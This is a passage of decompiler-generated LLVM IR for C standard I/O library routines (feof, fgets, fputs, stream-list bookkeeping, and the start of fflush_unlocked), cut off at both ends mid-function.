  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 21, { 0, 2, 1 }
  uselistorder i32 2152, { 1, 2, 0, 3 }
  uselistorder i32 -36924, { 0, 2, 1, 3 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder label %dec_label_pc_1134c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11348, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_11314, { 1, 0 }
  uselistorder label %dec_label_pc_112e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_112d8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11294, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_1124c, { 1, 0, 2 }
  uselistorder label %bb152, { 2, 1, 0 }
  uselistorder label %.thread24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11060, { 1, 0 }
  uselistorder label %dec_label_pc_11014, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10f90, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10f8c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10f2c, { 1, 0 }
  uselistorder label %dec_label_pc_10f28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10f2c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10ecc, { 1, 0 }
  uselistorder label %dec_label_pc_10ea0, { 1, 0 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_11388 = load i32, i32* @r4, align 4
  store i32 %v3_11388, i32* %stack_var_-20, align 4
  %v2_1138c = add i32 %tmp, 52
  %v3_1138c = inttoptr i32 %v2_1138c to i32*
  %v4_1138c = load i32, i32* %v3_1138c, align 4
  store i32 87428, i32* %r5.global-to-local, align 4
  %v1_11394 = sub i32 1, %v4_1138c
  %v2_11394 = icmp ult i32 %v4_1138c, 2
  br i1 %v2_11394, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_11394, %entry ]
  %v0_1139c = phi i32 [ 0, %bb ], [ %v1_11394, %entry ]
  store i32 %storemerge, i32* %r7.global-to-local, align 4
  %v2_1139c = icmp eq i32 %v0_1139c, 0
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r5.global-to-local, align 4
  br i1 %v2_1139c, label %dec_label_pc_113e8, label %dec_label_pc_113b0

dec_label_pc_113b0:                               ; preds = %thread-pre-split
  %v2_113b4 = add i32 %tmp, 56
  store i32 %v2_113b4, i32* %r4.global-to-local, align 4
  %v4_113c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_113c8)
  %v0_113dc = load i32, i32* %r5.global-to-local, align 4
  %v2_113dc = add i32 %v0_113dc, 16
  %v3_113dc = inttoptr i32 %v2_113dc to i32*
  %v4_113dc = load i32, i32* %v3_113dc, align 4
  store i32 %v4_113dc, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_113dc)
  %v0_113e8.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_113ec.pre = load i32, i32* %r6.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_113e8.pre, 0
  br label %dec_label_pc_113e8

dec_label_pc_113e8:                               ; preds = %thread-pre-split, %dec_label_pc_113b0
  %v0_113ec = phi i32 [ %tmp, %thread-pre-split ], [ %v0_113ec.pre, %dec_label_pc_113b0 ]
  %v0_113e8 = phi i1 [ true, %thread-pre-split ], [ %phitmp, %dec_label_pc_113b0 ]
  %v1_113ec = inttoptr i32 %v0_113ec to i16*
  %v2_113ec = load i16, i16* %v1_113ec, align 2
  %v3_113ec = zext i16 %v2_113ec to i32
  store i32 %v3_113ec, i32* %r4.global-to-local, align 4
  br i1 %v0_113e8, label %dec_label_pc_113e8..thread4_crit_edge, label %bb15

dec_label_pc_113e8..thread4_crit_edge:            ; preds = %dec_label_pc_113e8
  %v0_11404.pre = load i32, i32* @ip, align 4
  br label %.thread4

bb15:                                             ; preds = %dec_label_pc_113e8
  %v1_113fc = load i32, i32* %r5.global-to-local, align 4
  %v3_113fc = add i32 %v1_113fc, 24
  %v4_113fc = inttoptr i32 %v3_113fc to i32*
  %v5_113fc = load i32, i32* %v4_113fc, align 4
  store i32 %v5_113fc, i32* @ip, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_113e8..thread4_crit_edge, %bb15
  %v0_11404 = phi i32 [ %v0_11404.pre, %dec_label_pc_113e8..thread4_crit_edge ], [ %v5_113fc, %bb15 ]
  %v2_11404 = xor i1 %v0_113e8, true
  call void @__pseudo_cond_branch(i1 %v2_11404, i32 %v0_11404)
  %v0_11408 = load i32, i32* %r4.global-to-local, align 4
  %v1_11408 = and i32 %v0_11408, 4
  %v2_11410 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11410, i32* @r4, align 4
  ret i32 %v1_11408

; uselistorder directives
  uselistorder i1 %v0_113e8, { 1, 0 }
  uselistorder i32 %v1_11394, { 1, 0 }
  uselistorder i32 %v4_1138c, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_113e8, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_1141c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1141c:
  %v0_1141c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1141c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1141c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1141c, %bb
  %v10_11428 = phi i32 [ %arg1, %dec_label_pc_1141c ], [ 0, %bb ]
  ret i32 %v10_11428

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1142c = load i32, i32* @r4, align 4
  store i32 %v3_1142c, i32* %stack_var_-28, align 4
  %v6_1142c = load i32, i32* @r5, align 4
  %v9_1142c = load i32, i32* @r6, align 4
  %v12_1142c = load i32, i32* @r7, align 4
  %v21_1142c = load i32, i32* @lr, align 4
  %v1_11430 = add i32 %arg3, 52
  %v2_11430 = inttoptr i32 %v1_11430 to i32*
  %v3_11430 = load i32, i32* %v2_11430, align 4
  %v1_11438 = sub i32 1, %v3_11430
  %v2_11438 = icmp ult i32 %v3_11430, 2
  br i1 %v2_11438, label %bb16, label %bb

bb:                                               ; preds = %entry
  br label %bb16

bb16:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_11438, %entry ]
  %v0_11440 = phi i32 [ 0, %bb ], [ %v1_11438, %entry ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_11440 = icmp eq i32 %v0_11440, 0
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_11440, label %dec_label_pc_11494, label %dec_label_pc_1145c

dec_label_pc_1145c:                               ; preds = %bb16
  %v1_11460 = add i32 %arg3, 56
  store i32 %v1_11460, i32* @r4, align 4
  %v4_11474 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_11474)
  %v0_11488 = load i32, i32* @r5, align 4
  %v2_11488 = add i32 %v0_11488, 16
  %v3_11488 = inttoptr i32 %v2_11488 to i32*
  %v4_11488 = load i32, i32* %v3_11488, align 4
  store i32 %v4_11488, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_11494.661 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11488)
  %v0_11494.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_11498.pre = load i32, i32* @r7, align 4
  %v0_1149c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11494

dec_label_pc_11494:                               ; preds = %bb16, %dec_label_pc_1145c
  %v0_1149c = phi i32 [ %arg3, %bb16 ], [ %v0_1149c.pre, %dec_label_pc_1145c ]
  %v0_11498 = phi i32 [ %arg2, %bb16 ], [ %v0_11498.pre, %dec_label_pc_1145c ]
  %v0_11494 = phi i32 [ %arg1, %bb16 ], [ %v0_11494.pre, %dec_label_pc_1145c ]
  %v3_114a0 = inttoptr i32 %v0_11494 to i8*
  %v4_114a0 = call i32 @__GI_fgets_unlocked(i8* %v3_114a0, i32 %v0_11498, i32 %v0_1149c)
  %v0_114a4 = load i32, i32* %sl.global-to-local, align 4
  %v2_114a4 = icmp eq i32 %v0_114a4, 0
  store i32 %v4_114a0, i32* %r4.global-to-local, align 4
  br i1 %v2_114a4, label %dec_label_pc_11494..thread3_crit_edge, label %bb17

dec_label_pc_11494..thread3_crit_edge:            ; preds = %dec_label_pc_11494
  %v0_114c0.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_11494
  %v1_114b8 = load i32, i32* @r5, align 4
  %v3_114b8 = add i32 %v1_114b8, 24
  %v4_114b8 = inttoptr i32 %v3_114b8 to i32*
  %v5_114b8 = load i32, i32* %v4_114b8, align 4
  store i32 %v5_114b8, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_11494..thread3_crit_edge, %bb17
  %v0_114c0 = phi i32 [ %v0_114c0.pre, %dec_label_pc_11494..thread3_crit_edge ], [ %v5_114b8, %bb17 ]
  %v2_114c0 = xor i1 %v2_114a4, true
  call void @__pseudo_cond_branch(i1 %v2_114c0, i32 %v0_114c0)
  %v0_114c4 = load i32, i32* %r4.global-to-local, align 4
  %v2_114cc = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_114cc, i32* @r4, align 4
  store i32 %v6_1142c, i32* @r5, align 4
  store i32 %v9_1142c, i32* @r6, align 4
  store i32 %v12_1142c, i32* @r7, align 4
  store i32 %v21_1142c, i32* @lr, align 4
  ret i32 %v0_114c4

; uselistorder directives
  uselistorder i32 %v3_11430, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 1, 2 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_11494, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_114d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_114d8:
  %v0_114d8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_114d8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_114d8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_114d8, %bb
  %v10_114e4 = phi i32 [ %arg1, %dec_label_pc_114d8 ], [ 0, %bb ]
  ret i32 %v10_114e4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_114e8 = load i32, i32* @r4, align 4
  store i32 %v3_114e8, i32* %stack_var_-24, align 4
  %v6_114e8 = load i32, i32* @r5, align 4
  %v9_114e8 = load i32, i32* @r6, align 4
  %v12_114e8 = load i32, i32* @r7, align 4
  %v15_114e8 = load i32, i32* @r8, align 4
  %v18_114e8 = load i32, i32* @lr, align 4
  %v1_114ec = add i32 %arg2, 52
  %v2_114ec = inttoptr i32 %v1_114ec to i32*
  %v3_114ec = load i32, i32* %v2_114ec, align 4
  %v1_114f4 = sub i32 1, %v3_114ec
  %v2_114f4 = icmp ult i32 %v3_114ec, 2
  br i1 %v2_114f4, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_114f4, %entry ]
  %v0_114fc = phi i32 [ 0, %bb ], [ %v1_114f4, %entry ]
  store i32 %storemerge, i32* @r8, align 4
  %v2_114fc = icmp eq i32 %v0_114fc, 0
  store i32 %arg2, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_114fc, label %dec_label_pc_1154c, label %dec_label_pc_11514

dec_label_pc_11514:                               ; preds = %thread-pre-split
  %v1_11518 = add i32 %arg2, 56
  store i32 %v1_11518, i32* @r4, align 4
  %v4_1152c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1152c)
  %v0_11540 = load i32, i32* @r5, align 4
  %v2_11540 = add i32 %v0_11540, 16
  %v3_11540 = inttoptr i32 %v2_11540 to i32*
  %v4_11540 = load i32, i32* %v3_11540, align 4
  store i32 %v4_11540, i32* @ip, align 4
  store i32 70988, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11540)
  %v0_1154c.pre = load i32, i32* @r7, align 4
  %v0_11550.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1154c

dec_label_pc_1154c:                               ; preds = %thread-pre-split, %dec_label_pc_11514
  %v0_11550 = phi i32 [ %arg2, %thread-pre-split ], [ %v0_11550.pre, %dec_label_pc_11514 ]
  %v0_1154c = phi i32 [ %arg1, %thread-pre-split ], [ %v0_1154c.pre, %dec_label_pc_11514 ]
  %v2_11554 = inttoptr i32 %v0_1154c to i8*
  %v3_11554 = call i32 @__GI_fputs_unlocked(i8* %v2_11554, i32 %v0_11550)
  %v0_11558 = load i32, i32* @r8, align 4
  %v2_11558 = icmp eq i32 %v0_11558, 0
  store i32 %v3_11554, i32* %r4.global-to-local, align 4
  br i1 %v2_11558, label %dec_label_pc_1154c..thread6_crit_edge, label %bb16

dec_label_pc_1154c..thread6_crit_edge:            ; preds = %dec_label_pc_1154c
  br label %.thread6

bb16:                                             ; preds = %dec_label_pc_1154c
  %v1_1156c = load i32, i32* @r5, align 4
  %v3_1156c = add i32 %v1_1156c, 24
  %v4_1156c = inttoptr i32 %v3_1156c to i32*
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1154c..thread6_crit_edge, %bb16
  %v0_11574.in = phi i32* [ @ip, %dec_label_pc_1154c..thread6_crit_edge ], [ %v4_1156c, %bb16 ]
  %v0_11574 = load i32, i32* %v0_11574.in, align 4
  %v2_11574 = xor i1 %v2_11558, true
  call void @__pseudo_cond_branch(i1 %v2_11574, i32 %v0_11574)
  %v0_11578 = load i32, i32* %r4.global-to-local, align 4
  %v2_11580 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11580, i32* @r4, align 4
  store i32 %v6_114e8, i32* @r5, align 4
  store i32 %v9_114e8, i32* @r6, align 4
  store i32 %v12_114e8, i32* @r7, align 4
  store i32 %v15_114e8, i32* @r8, align 4
  store i32 %v18_114e8, i32* @lr, align 4
  ret i32 %v0_11578

; uselistorder directives
  uselistorder i32 %v1_114f4, { 1, 0 }
  uselistorder i32 %v3_114ec, { 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1154c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_1158c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1158c:
  %v0_1158c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1158c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1158c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1158c, %bb
  %v10_11598 = phi i32 [ %arg1, %dec_label_pc_1158c ], [ 0, %bb ]
  ret i32 %v10_11598

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1159c = load i32, i32* @r4, align 4
  store i32 %v3_1159c, i32* %stack_var_-24, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r6.global-to-local, align 4
  %v4_115ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 36) to i32*), align 4
  store i32 %v4_115ac, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_115b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 112) to i32*), align 4
  store i32 %v4_115b4, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_115c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  store i32 %v4_115c0, i32* %r7.global-to-local, align 4
  %v2_115cc = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_115c0)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_115e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_115e0 = add i32 %v0_115e0, 16
  %v3_115e0 = inttoptr i32 %v2_115e0 to i32*
  %v4_115e0 = load i32, i32* %v3_115e0, align 4
  store i32 %v4_115e0, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_115e0)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_115f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_115f0 = add i32 %v0_115f0, 12
  %v3_115f0 = inttoptr i32 %v2_115f0 to i32*
  %v4_115f0 = load i32, i32* %v3_115f0, align 4
  store i32 %v4_115f0, i32* %r3.global-to-local, align 4
  %v1_115f4 = inttoptr i32 %v4_115f0 to i32*
  %v2_115f4 = load i32, i32* %v1_115f4, align 4
  store i32 %v2_115f4, i32* %r3.global-to-local, align 4
  %v7_115f8 = icmp eq i32 %v2_115f4, 1
  br i1 %v7_115f8, label %dec_label_pc_11600, label %dec_label_pc_116c0

dec_label_pc_11600:                               ; preds = %entry
  store i32 52, i32* %r3.global-to-local, align 4
  %v2_11604 = add i32 %v0_115f0, 52
  %v3_11604 = inttoptr i32 %v2_11604 to i32*
  %v4_11604 = load i32, i32* %v3_11604, align 4
  store i32 %v4_11604, i32* %r3.global-to-local, align 4
  %v1_11608 = inttoptr i32 %v4_11604 to i32*
  %v2_11608 = load i32, i32* %v1_11608, align 4
  store i32 %v2_11608, i32* %r3.global-to-local, align 4
  %tmp32 = icmp slt i32 %v2_11608, 1
  br i1 %tmp32, label %dec_label_pc_116c0, label %dec_label_pc_11614

dec_label_pc_11614:                               ; preds = %dec_label_pc_11600
  store i32 100, i32* %r3.global-to-local, align 4
  %v2_11618 = add i32 %v0_115f0, 100
  %v3_11618 = inttoptr i32 %v2_11618 to i32*
  %v4_11618 = load i32, i32* %v3_11618, align 4
  store i32 %v4_11618, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_115c0)
  call void @__pseudo_branch(i32 %v4_115e0)
  %v0_11640 = load i32, i32* %r6.global-to-local, align 4
  %v2_11640 = add i32 %v0_11640, 48
  %v3_11640 = inttoptr i32 %v2_11640 to i32*
  %v4_11640 = load i32, i32* %v3_11640, align 4
  store i32 %v4_11640, i32* %r3.global-to-local, align 4
  %v1_11644 = inttoptr i32 %v4_11640 to i32*
  %v2_11644 = load i32, i32* %v1_11644, align 4
  store i32 %v2_11644, i32* %r4.global-to-local, align 4
  store i32 48, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1169013 = icmp eq i32 %v2_11644, 0
  br i1 %v2_1169013, label %dec_label_pc_1169c, label %dec_label_pc_11654

dec_label_pc_11654:                               ; preds = %dec_label_pc_11614, %dec_label_pc_1168c
  %v0_116784 = phi i32 [ %v0_1168c, %dec_label_pc_1168c ], [ %v2_11644, %dec_label_pc_11614 ]
  %v1_11654 = inttoptr i32 %v0_116784 to i16*
  %v2_11654 = load i16, i16* %v1_11654, align 2
  %v3_11654 = zext i16 %v2_11654 to i32
  store i32 %v3_11654, i32* %r3.global-to-local, align 4
  %v2_11658 = and i32 %v3_11654, 32816
  %v7_1165c = icmp eq i32 %v2_11658, 48
  %v1_11660 = add i32 %v0_116784, 32
  %v2_11660 = inttoptr i32 %v1_11660 to i32*
  %v3_11660 = load i32, i32* %v2_11660, align 4
  store i32 %v3_11660, i32* %r5.global-to-local, align 4
  br i1 %v7_1165c, label %dec_label_pc_1166c, label %.thread23

.thread23:                                        ; preds = %dec_label_pc_11654
  store i32 %v0_116784, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1168c

dec_label_pc_1166c:                               ; preds = %dec_label_pc_11654
  %v0_1166c = load i32, i32* %r7.global-to-local, align 4
  %v2_1166c = icmp eq i32 %v0_1166c, 0
  br i1 %v2_1166c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_1166c
  %v1_11670 = load i32, i32* %r6.global-to-local, align 4
  %v2_11670 = load i32, i32* %r8.global-to-local, align 4
  %v3_11670 = add i32 %v2_11670, %v1_11670
  %v4_11670 = inttoptr i32 %v3_11670 to i32*
  %v5_11670 = load i32, i32* %v4_11670, align 4
  store i32 %v5_11670, i32* %r3.global-to-local, align 4
  %v3_11674 = inttoptr i32 %v5_11670 to i32*
  store i32 %v3_11660, i32* %v3_11674, align 4
  %v0_11678 = load i32, i32* %r4.global-to-local, align 4
  %v1_11678 = inttoptr i32 %v0_11678 to i16*
  %v2_11678 = load i16, i16* %v1_11678, align 2
  %v3_11678 = zext i16 %v2_11678 to i32
  store i32 %v3_11678, i32* %r3.global-to-local, align 4
  br label %bb33

bb:                                               ; preds = %dec_label_pc_1166c
  %v2_1167810 = load i16, i16* %v1_11654, align 2
  %v3_1167811 = zext i16 %v2_1167810 to i32
  store i32 %v3_1167811, i32* %r3.global-to-local, align 4
  %v3_1167c = add i32 %v0_1166c, 32
  %v4_1167c = inttoptr i32 %v3_1167c to i32*
  store i32 %v3_11660, i32* %v4_1167c, align 4
  %v0_11680.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %.thread, %bb
  %v0_11680 = phi i32 [ %v3_11678, %.thread ], [ %v0_11680.pre, %bb ]
  %v1_11680 = and i32 %v0_11680, 8192
  %v2_11680 = icmp eq i32 %v1_11680, 0
  br i1 %v2_11680, label %bb35, label %bb34

bb34:                                             ; preds = %bb33
  br label %bb35

bb35:                                             ; preds = %bb33, %bb34
  %v1_11688 = xor i1 %v2_11680, true
  call void @__pseudo_cond_branch(i1 %v1_11688, i32 ptrtoint (i32* @global_var_1375c.598 to i32))
  %v0_1168c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1168c

dec_label_pc_1168c:                               ; preds = %.thread23, %bb35
  %v0_1168c = phi i32 [ %v0_1168c.pre, %bb35 ], [ %v3_11660, %.thread23 ]
  store i32 %v0_1168c, i32* %r4.global-to-local, align 4
  %v2_11690 = icmp eq i32 %v0_1168c, 0
  br i1 %v2_11690, label %dec_label_pc_11690.dec_label_pc_1169c_crit_edge, label %dec_label_pc_11654

dec_label_pc_11690.dec_label_pc_1169c_crit_edge:  ; preds = %dec_label_pc_1168c
  %v0_116a8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1169c

dec_label_pc_1169c:                               ; preds = %dec_label_pc_11690.dec_label_pc_1169c_crit_edge, %dec_label_pc_11614
  %v0_116a8 = phi i32 [ %v0_116a8.pre, %dec_label_pc_11690.dec_label_pc_1169c_crit_edge ], [ %v0_11640, %dec_label_pc_11614 ]
  store i32 24, i32* %r3.global-to-local, align 4
  %v2_116a8 = add i32 %v0_116a8, 24
  %v3_116a8 = inttoptr i32 %v2_116a8 to i32*
  %v4_116a8 = load i32, i32* %v3_116a8, align 4
  call void @__pseudo_branch(i32 %v4_116a8)
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_116b8 = load i32, i32* %r6.global-to-local, align 4
  %v2_116b8 = add i32 %v0_116b8, 52
  %v3_116b8 = inttoptr i32 %v2_116b8 to i32*
  %v4_116b8 = load i32, i32* %v3_116b8, align 4
  store i32 %v4_116b8, i32* %r3.global-to-local, align 4
  %v0_116bc = load i32, i32* %r4.global-to-local, align 4
  %v2_116bc = inttoptr i32 %v4_116b8 to i32*
  store i32 %v0_116bc, i32* %v2_116bc, align 4
  %v0_116c4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_116c0

dec_label_pc_116c0:                               ; preds = %entry, %dec_label_pc_11600, %dec_label_pc_1169c
  %v0_116c4 = phi i32 [ %v0_115f0, %entry ], [ %v0_115f0, %dec_label_pc_11600 ], [ %v0_116c4.pre, %dec_label_pc_1169c ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_116c4 = add i32 %v0_116c4, 12
  %v3_116c4 = inttoptr i32 %v2_116c4 to i32*
  %v4_116c4 = load i32, i32* %v3_116c4, align 4
  %v1_116c8 = inttoptr i32 %v4_116c4 to i32*
  %v2_116c8 = load i32, i32* %v1_116c8, align 4
  %v1_116cc = add i32 %v2_116c8, -1
  store i32 %v1_116cc, i32* %v1_116c8, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_116e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_116e0 = add i32 %v0_116e0, 24
  %v3_116e0 = inttoptr i32 %v2_116e0 to i32*
  %v4_116e0 = load i32, i32* %v3_116e0, align 4
  store i32 %v4_116e0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_116e0)
  %v2_116f0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_116f0, i32* %r4.global-to-local, align 4
  ret i32 %v2_115cc

; uselistorder directives
  uselistorder i32 %v0_1168c, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 7, 3, 4, 5, 6, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 0, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder label %dec_label_pc_116c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1168c, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_11654, { 1, 0 }
}

define i32 @function_116fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_116fc:
  %v0_116fc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_116fc, label %bb, label %.thread8

bb:                                               ; preds = %dec_label_pc_116fc
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_116fc, %bb
  %v10_11720 = phi i32 [ %arg1, %dec_label_pc_116fc ], [ 0, %bb ]
  ret i32 %v10_11720

; uselistorder directives
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %sb.global-to-local, align 4
  %v4_11734 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 48) to i32*), align 4
  store i32 %v4_11734, i32* %r3.global-to-local, align 4
  %v10_11738 = icmp eq i32 %tmp, %v4_11734
  store i32 %tmp, i32* %fp.global-to-local, align 4
  br i1 %v10_11738, label %bb, label %dec_label_pc_11750

bb:                                               ; preds = %entry
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11760

dec_label_pc_11750:                               ; preds = %entry
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_11754 = icmp eq i16* %arg1, null
  br i1 %v2_11754, label %dec_label_pc_11760, label %dec_label_pc_118c8

dec_label_pc_11760:                               ; preds = %bb, %dec_label_pc_11750
